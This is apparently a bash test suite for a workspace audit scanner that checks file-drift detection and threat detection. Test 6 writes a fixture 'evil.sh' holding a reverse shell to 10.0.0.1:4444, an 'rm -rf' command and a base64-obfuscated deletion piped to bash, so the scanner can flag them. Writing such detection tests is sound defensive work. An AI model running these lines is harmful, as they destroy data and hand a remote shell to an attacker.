#!/usr/bin/env bash
# HexOS Phase 1.5 — Test: Workspace Audit Scanner
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SECURITY_DIR="$(dirname "$SCRIPT_DIR")"

PASS=0
FAIL=0

test_result() {
    local desc="$1" expected="$2" actual="$3"
    if [[ "$expected" == "$actual" ]]; then
        echo "  ✅ PASS: ${desc} (exit=$actual)"
        PASS=$((PASS + 1))
    else
        echo "  ❌ FAIL: ${desc} (expected=$expected, got=$actual)"
        FAIL=$((FAIL + 1))
    fi
}

echo "═══ Test: Workspace Audit Scanner ═══"
echo ""

# Setup temp workspace
TEST_WS=$(mktemp -d /tmp/hexos-test-ws-XXXXXX)
TEST_CLIENT="test-workspace-$$"
TEST_SECURITY="/tmp/hexos-security-baselines"

cleanup() {
    rm -rf "$TEST_WS" "$TEST_SECURITY" "/tmp/hexos-security-reports" 2>/dev/null
    rm -f /tmp/hexos-alert-dedup-* 2>/dev/null
}
trap cleanup EXIT

# Create initial workspace files
mkdir -p "$TEST_WS"/{workspace,skills}
echo "# Agent Workspace" > "$TEST_WS/workspace/AGENTS.md"
echo "console.log('hello');" > "$TEST_WS/workspace/app.js"
cat > "$TEST_WS/workspace/config.yaml" <<EOF
name: test
version: 1.0.0
settings:
  debug: false
EOF

echo "Test 1: Initial workspace scan (no baseline)"
RESULT=$("${SECURITY_DIR}/scan-workspace.sh" "$TEST_WS" "$TEST_CLIENT" 2>/dev/null)
EXIT_CODE=$?
test_result "Initial scan completes" "0" "$EXIT_CODE"

# Verify files were scanned
FILES_SCANNED=$(echo "$RESULT" | grep -o '"files_scanned":[0-9]*' | cut -d: -f2)
if [[ "$FILES_SCANNED" -gt 0 ]]; then
    echo "  ✅ PASS: Scanned ${FILES_SCANNED} files"
    PASS=$((PASS + 1))
else
    echo "  ❌ FAIL: No files scanned"
    FAIL=$((FAIL + 1))
fi

echo ""

# Test 2: Scan again with no changes (should pass with no drift)
echo "Test 2: Rescan with no changes"
RESULT=$("${SECURITY_DIR}/scan-workspace.sh" "$TEST_WS" "$TEST_CLIENT" 2>/dev/null)
EXIT_CODE=$?
test_result "No-change rescan passes" "0" "$EXIT_CODE"

echo ""

# Test 3: Add a new file and detect drift
echo "Test 3: Detect new file (drift)"
echo "// new file" > "$TEST_WS/workspace/new-feature.js"
RESULT=$("${SECURITY_DIR}/scan-workspace.sh" "$TEST_WS" "$TEST_CLIENT" 2>/dev/null)
EXIT_CODE=$?
test_result "Drift detected (new file)" "2" "$EXIT_CODE"

echo ""

# Test 4: Modify a file and detect drift
echo "Test 4: Detect modified file (drift)"
echo "# Modified content" >> "$TEST_WS/workspace/AGENTS.md"
RESULT=$("${SECURITY_DIR}/scan-workspace.sh" "$TEST_WS" "$TEST_CLIENT" 2>/dev/null)
EXIT_CODE=$?
test_result "Drift detected (modified file)" "2" "$EXIT_CODE"

echo ""

# Test 5: Delete a file and detect drift
echo "Test 5: Detect deleted file (drift)"
rm "$TEST_WS/workspace/new-feature.js"
RESULT=$("${SECURITY_DIR}/scan-workspace.sh" "$TEST_WS" "$TEST_CLIENT" 2>/dev/null)
EXIT_CODE=$?
test_result "Drift detected (deleted file)" "2" "$EXIT_CODE"

echo ""

# Test 6: Add a malicious file — should fail (threat)
echo "Test 6: Detect malicious file in workspace"
cat > "$TEST_WS/workspace/evil.sh" <<'EVIL'
#!/bin/bash
# Looks innocent but...
sudo rm -rf /important
bash -i >& /dev/tcp/10.0.0.1/4444
echo cm0gLXJmIC8= | base64 -d | bash
EVIL
RESULT=$("${SECURITY_DIR}/scan-workspace.sh" "$TEST_WS" "$TEST_CLIENT" 2>/dev/null)
EXIT_CODE=$?
test_result "Threat detected in workspace" "1" "$EXIT_CODE"

FINDINGS=$(echo "$RESULT" | grep -o '"total_findings":[0-9]*' | cut -d: -f2)
if [[ "$FINDINGS" -gt 0 ]]; then
    echo "  ✅ PASS: Found ${FINDINGS} threat(s)"
    PASS=$((PASS + 1))
else
    echo "  ❌ FAIL: No threats detected"
    FAIL=$((FAIL + 1))
fi

echo ""

# Test 7: Non-existent workspace
echo "Test 7: Non-existent workspace returns error"
"${SECURITY_DIR}/scan-workspace.sh" "/nonexistent/workspace" "nobody" 2>/dev/null
test_result "Non-existent workspace returns error" "3" "$?"

echo ""
echo "═══ Results: ${PASS} passed, ${FAIL} failed ═══"
exit $FAIL
